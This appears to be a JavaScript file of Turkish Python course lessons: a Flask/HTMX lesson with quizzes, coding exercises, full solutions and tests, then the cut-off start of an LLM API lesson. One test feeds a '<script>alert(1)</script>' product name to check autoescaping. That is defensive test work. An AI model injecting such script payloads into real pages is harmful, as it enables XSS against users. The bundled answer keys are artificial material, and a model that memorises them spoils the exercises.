/* Kesit Python — 'flask' dersi uzantısı: HTMX ile kısmi güncelleme, temel form, fetch ile JSON, SSR ve SPA farkı (AUDIT Ekle-12) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  { id: 'flask',
    min: 25,
    html: `<h2>Derinleş: HTMX ile kısmi güncelleme, form ve fetch ile JSON</h2><p>Flask şablonları her istekte <b>tam sayfa</b> üretir. Modern arayüzlerde ise sayfanın yalnız bir parçası değişir: arama kutusuna yazdıkça liste süzülür, "Sepete ekle"ye basınca yalnız sepet rozeti güncellenir. Bunun üç yolu var ve bir web geliştiricisinin üçünü de tanıması gerekir.</p><div class="tbl-wrap"><table><tr><th>Yaklaşım</th><th>Sunucu ne döndürür?</th><th>Artısı</th><th>Eksisi</th></tr><tr><td>Sunucu tarafı oluşturma (SSR, klasik)</td><td>Tam HTML sayfa</td><td>Basit, SEO dostu, JavaScript gerekmez</td><td>Her tıklamada sayfa yenilenir</td></tr><tr><td>HTMX ("HTML over the wire")</td><td>HTML parçası (partial)</td><td>SSR'nin basitliği + kısmi güncelleme; tek dil Python</td><td>Çok zengin istemci etkileşiminde sınırlı</td></tr><tr><td>SPA (React, Vue) + JSON API</td><td>JSON</td><td>Zengin, uygulama gibi arayüz; mobil ile aynı API</td><td>İki kod tabanı, derleme araçları, durum yönetimi</td></tr></table></div><h3>Temel HTML formu</h3><p>Her şeyin temeli, JavaScript olmadan da çalışan formdur. Alanların <code>name</code> özniteliği <code>request.form</code> anahtarını belirler; <code>label</code> ile <code>for</code> erişilebilirlik içindir; tarayıcı doğrulaması (<code>required</code>, <code>min</code>) kullanıcıya kolaylıktır ama sunucu doğrulamasının yerini tutmaz.</p><pre class="code">&lt;form method="post" action="/sepet"&gt;
  &lt;label for="urun"&gt;Ürün&lt;/label&gt;
  &lt;select id="urun" name="urun_id"&gt;
    &lt;option value="19"&gt;Bakır Cezve&lt;/option&gt;
    &lt;option value="20"&gt;Seramik Kupa Seti&lt;/option&gt;
  &lt;/select&gt;
  &lt;label for="adet"&gt;Adet&lt;/label&gt;
  &lt;input id="adet" name="adet" type="number" min="1" max="10" value="1" required&gt;
  &lt;button type="submit"&gt;Sepete ekle&lt;/button&gt;
&lt;/form&gt;</pre><h3>HTMX: öznitelikle AJAX</h3><p>HTMX küçük bir JavaScript kütüphanesidir; sayfaya tek <code>&lt;script&gt;</code> etiketiyle eklenir ve HTML'e yeni öznitelikler kazandırır: <code>hx-get</code>/<code>hx-post</code> hangi adrese istek atılacağını, <code>hx-target</code> gelen HTML'in nereye konacağını, <code>hx-swap</code> nasıl konacağını (<code>innerHTML</code>, <code>outerHTML</code>, <code>beforeend</code>), <code>hx-trigger</code> ne zaman tetikleneceğini söyler. Sunucu JSON değil <b>HTML parçası</b> döndürür.</p><pre class="code">&lt;script src="https://unpkg.com/htmx.org@2.0.4"&gt;&lt;/script&gt;

&lt;input type="search" name="q" placeholder="Ürün ara..."
       hx-get="/urunler" hx-trigger="input changed delay:300ms, search"
       hx-target="#sonuclar" hx-swap="innerHTML"&gt;
&lt;table&gt;&lt;tbody id="sonuclar"&gt;{% include "_urun_satirlari.html" %}&lt;/tbody&gt;&lt;/table&gt;</pre><pre class="code">from flask import Flask, render_template, request

@app.get("/urunler")
def urunler():
    q = request.args.get("q", "")
    liste = urun_ara(q)
    if request.headers.get("HX-Request") == "true":            # HTMX isteği: yalnız parça
        return render_template("_urun_satirlari.html", urunler=liste)
    return render_template("urunler.html", urunler=liste, q=q)  # normal istek: tam sayfa</pre><p>HTMX her isteğe <code>HX-Request: true</code> başlığı ekler. Aynı adres böylece hem tam sayfayı (doğrudan açılınca, arama motoru gelince) hem parçayı (HTMX çağırınca) sunar; buna aşamalı geliştirme (progressive enhancement) denir. Parça şablonu (<code>_urun_satirlari.html</code>) tam sayfa şablonunda <code>{% include %}</code> ile kullanıldığı için HTML iki kez yazılmaz. Mantığı Anadolu Market'in gerçek ürün tablosuyla tarayıcıda dene:</p><pre class="py">import veri
from jinja2 import Environment

urunler = veri.kayitlar("anadolu_market", "products")
env = Environment(autoescape=True)
parca = env.from_string(
    "{% for u in urunler %}&lt;tr&gt;&lt;td&gt;{{ u.name }}&lt;/td&gt;&lt;td&gt;{{ u.category }}&lt;/td&gt;"
    "&lt;td&gt;{{ '%.0f'|format(u.price) }} TL&lt;/td&gt;&lt;/tr&gt;\\n{% endfor %}")

def yanit(basliklar, q):
    liste = [u for u in urunler if q.lower() in u["name"].lower()]
    govde = parca.render(urunler=liste)
    if basliklar.get("HX-Request") == "true":
        return govde
    return "&lt;html&gt;&lt;body&gt;&lt;h1&gt;Ürünler&lt;/h1&gt;&lt;table&gt;" + govde + "&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;"

print(yanit({"HX-Request": "true"}, "set"))
print(yanit({}, "kupa")[:60], "...")</pre><p>Kategori sütunundaki <code>Ev &amp; Yaşam</code> değerinin çıktıda <code>&amp;amp;</code> olarak kaçırıldığına dikkat et: autoescape parçalarda da geçerlidir ve XSS'e karşı korur. Başarılı bir HTMX formundan sonra yönlendirme (302) yerine güncellenmiş parçayı döndür; başka bir bölgeyi de haberdar etmek için <code>HX-Trigger: sepetGuncellendi</code> yanıt başlığıyla bir olay yayınla.</p><h3>fetch ile JSON çağrısı</h3><p>Bir sayfada küçük bir JavaScript etkileşimi gerekiyorsa (sepet tutarını anında hesaplamak gibi) tarayıcının yerleşik <code>fetch</code> fonksiyonu yeterlidir. Flask tarafında <code>request.get_json()</code> gövdeyi okur, <code>jsonify</code> ya da sözlük döndürmek JSON yanıt üretir. Hatalarda da JSON ve doğru durum kodu dön ki istemci <code>r.ok</code> ile ayırt edebilsin.</p><pre class="code">// static/sepet.js
const r = await fetch("/api/sepet", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({urun_id: 19, adet: 2}),
});
const veri = await r.json();
if (r.ok) { document.querySelector("#tutar").textContent = veri.tutar + " TL"; }
else { alert(veri.hata); }</pre><pre class="code">@app.post("/api/sepet")
def sepet_api():
    govde = request.get_json(silent=True) or {}
    durum, sonuc = sepet_hesapla(govde)        # doğrulama + hesap, saf Python
    return sonuc, durum                         # Flask sözlüğü JSON'a çevirir</pre><div class="note"><b>Gerçek işte</b>İç araçlar, yönetim panelleri ve küçük e-ticaret siteleri için Flask + Jinja + HTMX üçlüsü, ayrı bir React projesine göre çok daha az kodla aynı kullanıcı deneyimini verir. Mobil uygulama da aynı veriyi istiyorsa JSON API (FastAPI ya da Flask) ve SPA tercih edilir. Mülakatta "SSR mı SPA mı?" sorusunun iyi cevabı ihtiyaçtan başlar: SEO, etkileşim yoğunluğu, ekip becerisi ve kaç farklı istemcinin olduğu.</div>`,
    ex: [
      { t: 'mc',
        stage: 'Isınma',
        q: 'Aynı <code>/urunler</code> adresi bazen tam sayfa, bazen yalnız tablo satırlarını döndürüyor. Flask görünümü hangisini döndüreceğine nasıl karar verir?',
        o: ['URL\'nin sonuna HTMX kendiliğinden ?partial=1 ekler', 'HTMX isteğe HX-Request: true başlığını ekler; görünüm bu başlığa bakar', 'İstek POST ise parça, GET ise tam sayfa döndürülür', 'Flask, isteğin tarayıcıdan mı JavaScript\'ten mi geldiğini kendisi bilir'],
        a: 1,
        why: 'HTMX her isteğe HX-Request başlığı koyar. Başlık yoksa istek normal gezinmedir (adres çubuğu, arama motoru) ve tam sayfa döner; böylece sayfa JavaScript olmadan da çalışır.' },
      { t: 'mc',
        stage: 'Isınma',
        q: 'Anadolu Market\'in ürün katalog sayfaları arama motorlarında iyi sıralanmalı, sayfalar hızlı açılmalı ve ekipte yalnız Python bilen iki geliştirici var. Hangisi en uygun başlangıçtır?',
        o: ['Ayrı bir React SPA ve yalnız JSON dönen bir API', 'Flask ile sunucu tarafı oluşturma, gereken yerlerde HTMX ile kısmi güncelleme', 'Tüm sayfayı tek bir fetch çağrısıyla JSON\'dan JavaScript ile oluşturmak', 'Her ürün için elle yazılmış ayrı statik HTML dosyaları'],
        a: 1,
        why: 'SSR, arama motorlarına hazır HTML verir ve ilk açılış hızlıdır; HTMX etkileşimi Python ve HTML ile ekler. SPA iki kod tabanı ve JavaScript uzmanlığı gerektirir; statik dosyalar fiyat ve stok değişince sürdürülemez.' },
      { t: 'predict',
        stage: 'Kodu oku',
        q: 'Parça şablonu autoescape açıkken render ediliyor. Bu kod ne yazdırır?',
        code: 'from jinja2 import Environment\nenv = Environment(autoescape=True)\nt = env.from_string(\'<option value="{{ k }}">{{ k }}</option>\')\nprint(t.render(k=\'Ev & Yaşam\'))\n',
        o: ['<option value="Ev &amp; Yaşam">Ev &amp; Yaşam</option>', '<option value="Ev & Yaşam">Ev & Yaşam</option>', '<option value="Ev &amp; Yaşam">Ev & Yaşam</option>', '<option value="Ev%20%26%20Yaşam">Ev & Yaşam</option>'],
        a: 0,
        why: 'autoescape her {{ }} çıktısında &, <, >, " ve \' karakterlerini HTML varlığına çevirir; öznitelik içinde de, metin içinde de. Tarayıcı &amp;amp; değerini ekranda & olarak gösterir ve form gönderiminde de & olarak yollar.' },
      { t: 'code',
        id: 'flask-w1',
        stage: 'Rehberli',
        diff: 1,
        q: '<p>Canlı arama kutusunun sunucu tarafı: <code>urun_ara(q, kategori=None)</code> Anadolu Market\'in gerçek ürünlerinden adı <code>q</code>\'yu içerenleri (Türkçe büyük/küçük harf duyarsız) döndürsün; <code>kategori</code> verilirse ona da eşit olsun. Boş ya da yalnız boşluk olan <code>q</code> tüm ürünleri (kategori süzgeciyle) verir. Sonuç <code>name</code>\'e göre değil, orijinal sırada (product_id) kalsın. <code>tr_kucuk</code> yardımcısı hazır.</p>',
        guide: ['q\'nun başındaki ve sonundaki boşlukları at, tr_kucuk ile küçült.', 'Ürünleri gez; kategori verildiyse eşit olmayanları atla.', 'Ürün adının tr_kucuk hâli q\'yu içeriyorsa sonuca ekle.'],
        example: 'kelimeler = ["Çay", "Kahve", "Çaydanlık"]\nprint([k for k in kelimeler if "çay" in k.lower()])\n',
        start: 'import veri\nurunler = veri.kayitlar("anadolu_market", "products")\ndef tr_kucuk(s):\n    return s.replace("I", "ı").replace("İ", "i").lower()\n\ndef urun_ara(q, kategori=None):\n    sonuc = []\n    # TODO: q\'yu temizle ve küçült, ürünleri süz\n    return sonuc\n',
        sol: 'import veri\nurunler = veri.kayitlar("anadolu_market", "products")\ndef tr_kucuk(s):\n    return s.replace("I", "ı").replace("İ", "i").lower()\ndef urun_ara(q, kategori=None):\n    aranan = tr_kucuk(q.strip())\n    sonuc = []\n    for u in urunler:\n        if kategori and u["category"] != kategori:\n            continue\n        if aranan in tr_kucuk(u["name"]):\n            sonuc.append(u)\n    return sonuc\n',
        tests: 'adlar = lambda l: [u["name"] for u in l]\nassert adlar(urun_ara("krem")) == ["Nemlendirici Krem", "Güneş Kremi SPF50"], "krem iki üründe geçer"\nassert adlar(urun_ara("İNCE")) == ["İnce Memed"], "Türkçe İ/i doğru eşleşmeli"\nassert adlar(urun_ara("ince")) == ["İnce Memed"], "\'ince\' de İnce Memed\\\'i bulmalı (lower() İ\\\'yi bozar)"\nassert len(urun_ara("  ")) == 40, "Boş arama tüm 40 ürünü döndürmeli"\nassert adlar(urun_ara("set", "Ev & Yaşam")) == ["Çaydanlık Seti", "Seramik Kupa Seti"]\nassert urun_ara("set", "Spor")[0]["name"] == "Dambıl Seti 10kg"\n',
        hints: ['Boş metin her metnin içinde geçer: "" in "abc" True\'dur; boş arama kendiliğinden hepsini verir.', 'Python\'un lower() metodu "İ" harfini iki karakterlik "i̇" yapar; bu yüzden tr_kucuk kullan.'],
        why: 'Canlı aramada her tuşa basışta bu fonksiyon çalışır; HTMX\'in delay:300ms ayarı istek sayısını azaltır. Türkçe harf dönüşümü doğru yapılmazsa "İnce Memed" hiç bulunamaz.' },
      { t: 'code',
        id: 'flask-w2',
        stage: 'Rehberli',
        diff: 2,
        q: '<p>Parça şablonunu yaz: <code>satirlar_html(liste)</code> jinja2 ile (<code>autoescape=True</code>) her ürün için tam olarak şu satırı üretsin ve hepsini birleştirip döndürsün: <code>&lt;tr id="urun-{product_id}"&gt;&lt;td&gt;{name}&lt;/td&gt;&lt;td&gt;{fiyat} TL&lt;/td&gt;&lt;/tr&gt;</code>. Fiyat binlik ayırıcı nokta ile ve kuruşsuz yazılsın (<code>15999.0</code> → <code>15.999</code>). Liste boşsa tek satır: <code>&lt;tr&gt;&lt;td colspan="2"&gt;Sonuç yok&lt;/td&gt;&lt;/tr&gt;</code>. Satırlar arasında boşluk ya da yeni satır olmasın.</p>',
        guide: ['Environment(autoescape=True) kur.', 'Fiyatı biçimleyen bir filtre yaz: f"{x:,.0f}".replace(",", ".") ve env.filters\'a ekle.', 'Şablonda for ... else kullan: else bloğu liste boşken çalışır.', 'Şablonu tek satır yaz ki araya boşluk girmesin.'],
        example: 'from jinja2 import Environment\nenv = Environment(autoescape=True)\nenv.filters["iki_kat"] = lambda x: x * 2\nprint(env.from_string("{% for a in l %}[{{ a|iki_kat }}]{% else %}boş{% endfor %}").render(l=[1, 2]))\n',
        start: 'import veri\nurunler = veri.kayitlar("anadolu_market", "products")\nfrom jinja2 import Environment\n\ndef satirlar_html(liste):\n    env = Environment(autoescape=True)\n    # TODO: fiyat filtresi ve şablon\n    return ""\n',
        sol: 'import veri\nurunler = veri.kayitlar("anadolu_market", "products")\nfrom jinja2 import Environment\n\ndef satirlar_html(liste):\n    env = Environment(autoescape=True)\n    env.filters["tl"] = lambda x: f"{x:,.0f}".replace(",", ".")\n    t = env.from_string(\n        \'{% for u in liste %}<tr id="urun-{{ u.product_id }}"><td>{{ u.name }}</td><td>{{ u.price|tl }} TL</td></tr>\'\n        \'{% else %}<tr><td colspan="2">Sonuç yok</td></tr>{% endfor %}\')\n    return t.render(liste=liste)\n',
        tests: 'assert satirlar_html([urunler[29]]) == \'<tr id="urun-30"><td>Koşu Bandı</td><td>15.999 TL</td></tr>\', "Binlik ayırıcı nokta olmalı"\nassert satirlar_html([]) == \'<tr><td colspan="2">Sonuç yok</td></tr>\'\nh = satirlar_html([urunler[6], urunler[37]])\nassert h == \'<tr id="urun-7"><td>27&#34; Monitör</td><td>7.499 TL</td></tr><tr id="urun-38"><td>Dudak Balmı</td><td>79 TL</td></tr>\', f"Ad içindeki tırnak kaçırılmalı; gelen {h}"\nkotu = {"product_id": 99, "name": "<script>alert(1)</script>", "price": 1.0}\nassert "<script>" not in satirlar_html([kotu]), "autoescape açık olmalı"\n',
        hints: ['Jinja\'da {% for %} ... {% else %} ... {% endfor %} boş liste durumunu yakalar.', 'Python biçimlendirmesi binlik ayırıcı olarak virgül koyar; replace ile noktaya çevir.'],
        why: 'HTMX parçası, tam sayfada {% include %} ile kullanılan şablonun aynısıdır. Gerçek üründe "27\\" Monitör" adındaki çift tırnak bile kaçırılır; autoescape kapalı olsaydı kötü niyetli bir ürün adı betik çalıştırabilirdi.' },
      { t: 'code',
        id: 'flask-w3',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Görünümün karar mantığını yaz: <code>yanit_uret(basliklar, parca)</code>. <code>basliklar</code> istek başlık sözlüğü, <code>parca</code> hazır HTML parçası. Dönüş <code>(govde, yanit_basliklari)</code>:</p><ul><li><code>HX-Request</code> değeri <code>"true"</code> ise gövde yalnız parça.</li><li>Değilse gövde <code>&lt;!doctype html&gt;&lt;html&gt;&lt;body&gt;&lt;table&gt;&lt;tbody id="sonuclar"&gt;</code> + parça + <code>&lt;/tbody&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</code>.</li><li>Her iki durumda da yanıt başlıklarında <code>{"Vary": "HX-Request"}</code> olsun (önbellekler iki yanıtı karıştırmasın).</li><li>Başlık adları büyük/küçük harf duyarsız okunmalı (<code>hx-request</code> da geçerli).</li></ul>',
        start: 'def yanit_uret(basliklar, parca):\n    pass\n',
        sol: 'def yanit_uret(basliklar, parca):\n    kucuk = {k.lower(): v for k, v in basliklar.items()}\n    yb = {"Vary": "HX-Request"}\n    if kucuk.get("hx-request") == "true":\n        return parca, yb\n    sayfa = (\'<!doctype html><html><body><table><tbody id="sonuclar">\' + parca\n             + "</tbody></table></body></html>")\n    return sayfa, yb\n',
        tests: 'p = "<tr><td>Bakır Cezve</td></tr>"\nassert yanit_uret({"HX-Request": "true"}, p) == (p, {"Vary": "HX-Request"})\nassert yanit_uret({"hx-request": "true"}, p)[0] == p, "Başlık adı harf duyarsız okunmalı"\ng, b = yanit_uret({}, p)\nassert g == \'<!doctype html><html><body><table><tbody id="sonuclar"><tr><td>Bakır Cezve</td></tr></tbody></table></body></html>\'\nassert b == {"Vary": "HX-Request"}, "Tam sayfada da Vary olmalı"\nassert yanit_uret({"HX-Request": "false"}, p)[0].startswith("<!doctype"), "Yalnız \'true\' değeri parça döndürür"\n',
        hints: ['HTTP başlık adları büyük/küçük harf duyarsızdır; sözlüğü küçük harf anahtarlarla yeniden kur.', 'Vary başlığı her iki dalda da dönmeli.'],
        why: 'Aynı adres iki farklı içerik döndürdüğü için Vary başlığı tarayıcı ve CDN önbelleğine "yanıt HX-Request başlığına göre değişir" der; yoksa geri tuşunda kullanıcı çıplak bir tablo parçası görebilir.' },
      { t: 'code',
        id: 'flask-w4',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p><code>fetch</code> ile gelen JSON\'u işleyen uç noktanın mantığı: <code>sepet_hesapla(govde_metni)</code> <code>(durum, sozluk)</code> döndürsün. Kurallar:</p><ul><li>Gövde geçerli JSON nesnesi değilse <code>(400, {"hata": "geçersiz JSON"})</code>.</li><li><code>kalemler</code> anahtarı boş olmayan liste olmalı; her kalem <code>{"urun_id": int, "adet": int}</code>. Ürün gerçek <code>products</code> tablosunda yoksa <code>(404, {"hata": "ürün yok: ID"})</code>; adet 1–10 dışında ya da int değilse <code>(422, {"hata": "geçersiz adet"})</code>; kalemler eksik/boşsa <code>(422, {"hata": "kalemler gerekli"})</code>.</li><li>Başarıda <code>(200, {"adet": toplam_adet, "tutar": toplam_tutar})</code>; tutar gerçek fiyatlarla, <code>round(..., 2)</code>.</li></ul><p><code>bool</code> değerler adet olarak kabul edilmemeli (<code>True</code> bir int alt sınıfıdır).</p>',
        start: 'import veri\nurunler = veri.kayitlar("anadolu_market", "products")\nimport json\n\ndef sepet_hesapla(govde_metni):\n    pass\n',
        sol: 'import veri\nurunler = veri.kayitlar("anadolu_market", "products")\nimport json\n\nFIYAT = {u["product_id"]: u["price"] for u in urunler}\n\ndef sepet_hesapla(govde_metni):\n    try:\n        govde = json.loads(govde_metni)\n    except (json.JSONDecodeError, TypeError):\n        return 400, {"hata": "geçersiz JSON"}\n    if not isinstance(govde, dict):\n        return 400, {"hata": "geçersiz JSON"}\n    kalemler = govde.get("kalemler")\n    if not isinstance(kalemler, list) or not kalemler:\n        return 422, {"hata": "kalemler gerekli"}\n    adet_toplam, tutar = 0, 0.0\n    for k in kalemler:\n        uid, adet = k.get("urun_id"), k.get("adet")\n        if uid not in FIYAT:\n            return 404, {"hata": f"ürün yok: {uid}"}\n        if type(adet) is not int or not 1 <= adet <= 10:\n            return 422, {"hata": "geçersiz adet"}\n        adet_toplam += adet\n        tutar += FIYAT[uid] * adet\n    return 200, {"adet": adet_toplam, "tutar": round(tutar, 2)}\n',
        tests: 'assert sepet_hesapla(\'{"kalemler": [{"urun_id": 19, "adet": 2}, {"urun_id": 20, "adet": 1}]}\') == (200, {"adet": 3, "tutar": 915.0}), "2 cezve (320) + 1 kupa seti (275) = 915"\nassert sepet_hesapla("{bozuk") == (400, {"hata": "geçersiz JSON"})\nassert sepet_hesapla("[1, 2]")[0] == 400, "Nesne olmayan JSON reddedilmeli"\nassert sepet_hesapla(\'{"kalemler": []}\') == (422, {"hata": "kalemler gerekli"})\nassert sepet_hesapla(\'{"kalemler": [{"urun_id": 99, "adet": 1}]}\') == (404, {"hata": "ürün yok: 99"})\nassert sepet_hesapla(\'{"kalemler": [{"urun_id": 1, "adet": 11}]}\')[0] == 422\nassert sepet_hesapla(\'{"kalemler": [{"urun_id": 1, "adet": true}]}\')[0] == 422, "true adet sayılmamalı"\nassert sepet_hesapla(\'{"kalemler": [{"urun_id": 30, "adet": 1}]}\')[1]["tutar"] == 15999.0\n',
        hints: ['Önce json.loads\'u try içine al; sonra tipleri sırayla denetle.', 'Ürün fiyatlarını bir sözlükte topla: {product_id: price}.', 'type(adet) is int ifadesi bool\'u dışarıda bırakır; isinstance bırakmaz.'],
        why: 'İstemciden gelen hiçbir değere güvenme: fiyat bile istemciden alınmaz, sunucudaki tablodan okunur. Doğru durum kodu (400 biçim, 404 bulunamadı, 422 doğrulama) JavaScript tarafının hatayı doğru göstermesini sağlar.' },
      { t: 'code',
        id: 'flask-w5',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. <code>sepete_ekle(istek)</code> görünümü hem klasik form gönderimini hem HTMX\'i desteklemeli: klasik istekte POST/Redirect/GET gereği <code>(302, "", {"Location": "/sepet"})</code>, HTMX isteğinde ise <b>200</b> ile güncel sepet rozeti parçası (<code>&lt;span id="sepet-rozet"&gt;N&lt;/span&gt;</code>) ve <code>{"HX-Trigger": "sepetGuncellendi"}</code> başlığı döndürmeli. Şu an HTMX isteklerinde de 302 dönüyor; HTMX yönlendirmeyi izleyip tüm sepet sayfasını küçük rozetin içine gömüyor. Ayrıca adet metin olarak gelince sepet sayısı yanlış artıyor.</p>',
        start: 'SEPET = {"adet": 0}\n\ndef sepete_ekle(istek):\n    adet = istek["form"].get("adet", "1")\n    SEPET["adet"] += len(adet)\n    return 302, "", {"Location": "/sepet"}\n',
        sol: 'SEPET = {"adet": 0}\n\ndef sepete_ekle(istek):\n    adet = int(istek["form"].get("adet", "1"))\n    SEPET["adet"] += adet\n    if istek["basliklar"].get("HX-Request") == "true":\n        govde = f\'<span id="sepet-rozet">{SEPET["adet"]}</span>\'\n        return 200, govde, {"HX-Trigger": "sepetGuncellendi"}\n    return 302, "", {"Location": "/sepet"}\n',
        tests: 'SEPET["adet"] = 0\nr = sepete_ekle({"form": {"adet": "12"}, "basliklar": {"HX-Request": "true"}})\nassert r == (200, \'<span id="sepet-rozet">12</span>\', {"HX-Trigger": "sepetGuncellendi"}), f"HTMX isteğine parça dönmeli; gelen {r}"\nr2 = sepete_ekle({"form": {"adet": "3"}, "basliklar": {}})\nassert r2 == (302, "", {"Location": "/sepet"}), "Klasik formda PRG korunmalı"\nassert SEPET["adet"] == 15, f"12 + 3 = 15 olmalı; gelen {SEPET[\'adet\']}"\n',
        hints: ['request.form değerleri her zaman metindir; len("12") 2 verir.', 'HX-Request başlığına göre iki farklı yanıt üret.'],
        why: 'HTMX, fetch gibi 3xx yanıtları tarayıcı düzeyinde izler ve hedef sayfanın tamamını hedef öğeye koyar. HTMX isteğinde parça döndürüp diğer bölgeleri HX-Trigger olayıyla güncellemek doğru kalıptır.' },
      { t: 'code',
        id: 'flask-w6',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>"Kaydırdıkça yükle" (infinite scroll) parçası. <code>sayfa_parcasi(kategori, sayfa, boyut=5)</code> gerçek ürünlerden <code>kategori</code>\'ye ait olanları (product_id sırasıyla) sayfalasın (sayfa 1\'den başlar) ve her ürün için <code>&lt;tr&gt;&lt;td&gt;{name}&lt;/td&gt;&lt;/tr&gt;</code> üretsin (ad HTML kaçışlı: <code>html.escape</code>). Sonraki sayfa varsa sona bir gözcü satırı ekle:</p><p><code>&lt;tr hx-get="/urunler?kategori=...&amp;amp;sayfa=N" hx-trigger="revealed" hx-swap="outerHTML"&gt;&lt;td&gt;Yükleniyor...&lt;/td&gt;&lt;/tr&gt;</code></p><p>Adres <code>urllib.parse.urlencode({"kategori": k, "sayfa": N})</code> ile kurulsun ve öznitelik içinde <code>html.escape</code> ile kaçırılsın (<code>&amp;</code> → <code>&amp;amp;</code>). Sayfa aralık dışındaysa boş metin döndür.</p>',
        start: 'import veri\nurunler = veri.kayitlar("anadolu_market", "products")\nimport html\nfrom urllib.parse import urlencode\n\ndef sayfa_parcasi(kategori, sayfa, boyut=5):\n    pass\n',
        sol: 'import veri\nurunler = veri.kayitlar("anadolu_market", "products")\nimport html\nfrom urllib.parse import urlencode\n\ndef sayfa_parcasi(kategori, sayfa, boyut=5):\n    secili = [u for u in urunler if u["category"] == kategori]\n    bas = (sayfa - 1) * boyut\n    if sayfa < 1 or bas >= len(secili):\n        return ""\n    parca = secili[bas:bas + boyut]\n    satirlar = "".join(f"<tr><td>{html.escape(u[\'name\'])}</td></tr>" for u in parca)\n    if bas + boyut < len(secili):\n        adres = "/urunler?" + urlencode({"kategori": kategori, "sayfa": sayfa + 1})\n        satirlar += (f\'<tr hx-get="{html.escape(adres)}" hx-trigger="revealed" hx-swap="outerHTML">\'\n                     "<td>Yükleniyor...</td></tr>")\n    return satirlar\n',
        tests: 'p1 = sayfa_parcasi("Elektronik", 1)\nassert p1.count("<tr><td>") == 5 and "Kablosuz Kulaklık" in p1, "İlk sayfada 5 ürün"\nassert p1.endswith(\'<tr hx-get="/urunler?kategori=Elektronik&amp;sayfa=2" hx-trigger="revealed" hx-swap="outerHTML"><td>Yükleniyor...</td></tr>\'), f"Gözcü satırı hatalı: {p1[-140:]}"\np2 = sayfa_parcasi("Elektronik", 2)\nassert "hx-get" not in p2 and p2.count("<tr>") == 3, "Elektronikte 8 ürün var: 2. sayfa 3 ürün, gözcü yok"\nassert "27&quot; Monitör" in p2, "Ad içindeki tırnak kaçırılmalı"\ne = sayfa_parcasi("Ev & Yaşam", 1)\nassert "kategori=Ev+%26+Ya%C5%9Fam&amp;sayfa=2" in e, "Kategori URL kodlanmalı, & öznitelikte kaçırılmalı"\nassert sayfa_parcasi("Kitap", 3) == "" and sayfa_parcasi("Kitap", 0) == ""\n',
        hints: ['Dilim başlangıcı (sayfa - 1) * boyut.', 'urlencode boşluğu + ve & karakterini %26 yapar; ardından html.escape adresi öznitelik için güvenli kılar.', 'Gözcü yalnız bas + boyut < toplam ise eklenir.'],
        why: 'hx-trigger="revealed" satır ekranda görünür olunca isteği atar; outerHTML gözcü satırının kendisini yeni satırlarla değiştirir. Böylece JavaScript yazmadan sonsuz kaydırma elde edilir. URL kodlama ve HTML kaçışı iki ayrı katmandır ve ikisi de gerekir.' }
    ],
    faq: [
      { q: 'HTMX öğrenmek için JavaScript bilmem gerekir mi?',
        a: 'Temel kullanım için hayır: öznitelikler ve sunucunun döndürdüğü HTML yeter. Yine de tarayıcı geliştirici araçlarında Ağ (Network) sekmesini okuyabilmek, fetch ve olay (event) kavramlarını bilmek hata ayıklamayı çok kolaylaştırır. Karmaşık istemci durumları gerekiyorsa küçük bir Alpine.js ya da SPA bileşeni eklenebilir.' },
      { q: 'HTMX ile POST isteklerinde CSRF koruması nasıl olur?',
        a: 'Flask-WTF kullanıyorsan şablonda belirteci (token) bir meta etikete koy ve <code>hx-headers=\'{"X-CSRFToken": "..."}\'</code> özniteliğiyle <code>body</code> etiketine ekle; böylece tüm HTMX istekleri başlığı taşır. Form içi gönderimlerde gizli alan da yeterlidir. Django dersindeki ek bölümde aynı konuyu Django açısından görürsün.' }
    ],
    mistakes: [
      { bad: 'return redirect("/sepet")  # HTMX isteğinde de',
        good: 'if request.headers.get("HX-Request") == "true":\n    return render_template("_rozet.html", adet=n), 200, {"HX-Trigger": "sepetGuncellendi"}\nreturn redirect("/sepet")',
        why: 'HTMX yönlendirmeyi izler ve tam sayfayı küçük hedef öğenin içine koyar; HTMX isteklerine parça döndür.' }
    ] }
);
})(window);
/* Kesit Python — 'llm-api' dersi uzantısı: yerel modeller, Protocol ile sağlayıcıdan bağımsız istemci, SSE ve model yönlendirme (AUDIT Ekle-9) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  { id: 'llm-api',
    min: 25,
    html: `<h2>Derinleş: yerel modeller, sağlayıcıdan bağımsız istemci, SSE ve model yönlendirme</h2><p>Şimdiye kadar tek bir bulut sağlayıcısının SDK'sıyla çalıştın. Gerçek projelerde üç ihtiyaç hemen çıkar: müşteri verisi dışarı çıkmasın diye <b>yerel model</b> kullanmak, sağlayıcı değişince kodu baştan yazmamak ve cevabı kullanıcıya <b>akış</b> (streaming) olarak iletmek. Bir de maliyet: her soruya en büyük modeli çağırmak gereksiz pahalıdır.</p><h3>Açık ve yerel modeller</h3><p>Açık ağırlıklı (open-weight) modelleri kendi makinende ya da sunucunda çalıştırabilirsin. En kolay yol <b>Ollama</b>dır: modeli indirir, yerelde bir HTTP sunucusu açar (varsayılan <code>localhost:11434</code>) ve OpenAI uyumlu bir uç nokta sunar. vLLM ve LM Studio da aynı uyumlu arayüzü verir; Hugging Face ise barındırılan modeller için <code>InferenceClient</code> sağlar.</p><pre class="code"># Terminal: ollama pull llama3.2   ve   ollama serve
from openai import OpenAI      # pip install openai

yerel = OpenAI(base_url="http://localhost:11434/v1", api_key="ollama")  # anahtar yok sayılır
cevap = yerel.chat.completions.create(
    model="llama3.2",
    messages=[{"role": "user", "content": "Kargo gecikmesi şikâyetini tek cümlede özetle: ..."}],
)
print(cevap.choices[0].message.content)

from huggingface_hub import InferenceClient   # pip install huggingface_hub
hf = InferenceClient(token="hf_...")          # anahtarı ortam değişkeninden oku
